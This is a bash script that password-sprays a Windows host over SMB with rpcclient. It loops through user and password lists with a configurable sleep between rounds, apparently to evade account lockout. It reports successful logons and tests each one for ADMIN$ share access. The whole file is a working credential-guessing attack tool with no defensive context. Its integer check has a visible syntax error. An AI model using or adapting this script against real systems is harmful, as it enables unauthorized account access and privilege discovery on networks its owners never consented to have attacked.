#!/bin/bash
 
HOST="$1"
USERS="$2"
PASSWORDS="$3"
SLEEP="$4"
 
TMP_FILE="/tmp/tmp_smb.$$.tmp"
RPCCLIENT=$(which rpcclient)
NMBLOOKUP=$(which nmblookup)
OPTIONS="client max protocol=SMB3"
 
# 45.5 minutes = 2730 seconds
 
print_help() {
        echo "Usage: $(basename $0) <Host/IP address> <Users file> <Passwords file> <Sleep seconds>"
}
 
 
if [ -z "$HOST" ]; then
        echo "Error: Provide me with a host or IP address"
        print_help
        exit 1
fi
 
if [ -z "$USERS" ]; then
        echo "Error: Provide me with a users file"
        print_help
        exit 2
elif [ ! -f "$USERS" ]; then
        echo "Error: Users file doesn't exist"
        print_help
        exit 3
fi
 
if [ -z "$PASSWORDS" ]; then
        echo "Error: Provide me with a password file"
        print_help
        exit 4
elif [ ! -f "$PASSWORDS" ]; then
        echo "Error: Passwords file doesn't exist"
        print_help
        exit 5
fi
 
if [ -z "$SLEEP" ]; then
        echo "Error: Provide me with a number of seconds to sleep"
        print_help
        exit 6
elif [[ ! "$SLEEP" =~ ^[0-9]+$]] ; then
        echo "Error: Provide me with an integer"
        print_help
        exit 7
fi
 
DOMAIN="$($NMBLOOKUP -A $HOST | grep GROUP | head -1 | awk '{print $1}')"
 
LINES=$(wc -l $PASSWORDS | awk '{print $1}')
ITR="0"
 
while read PASS; do
    ITR="$((ITR + 1))"
    while read USER; do
 
        $RPCCLIENT --options="$OPTIONS" -U "${DOMAIN}\\${USER}%${PASS}" "$HOST" -c "getusername; quit" > $TMP_FILE
 
        if [[ $? -gt 0 ]]; then
            echo -en "\e[31m[-]\e[0m "
            echo "ERROR: $(cat $TMP_FILE)"
 
            echo -en "\e[31m[-]\e[0m "
            echo "${DOMAIN}\\${USER}:${PASS} - LOGON FAILED"
        else
            echo -en "\e[32m[+]\e[0m "
            echo "${DOMAIN}\\${USER}:${PASS} - LOGON SUCCESS"
 
            $RPCCLIENT --options="$OPTIONS" -U "${DOMAIN}\\${USER}%${PASS}" "$HOST" -c "netsharegetinfo 'ADMIN\$'; quit" > $TMP_FILE
            TEST=$(grep -c netname $TMP_FILE)
 
            if [[ $TEST -gt 0 ]]; then
                echo -en "\e[95m[+]\e[0m "
                echo -n "${DOMAIN}\\${USER}:${PASS} - "
                echo -e "\e[95mADMIN\$ access SUCCESS!\e[0m"
            fi
        fi
    done < <(cat "$USERS")
 
    if [[ $ITR -lt $LINES ]]; then
        echo -e "\e[33m[+]\e[0m Sleeping ${SLEEP} seconds."
        sleep ${SLEEP}
    fi
done < <(cat "$PASSWORDS")
 
rm -f $TMP_FILE
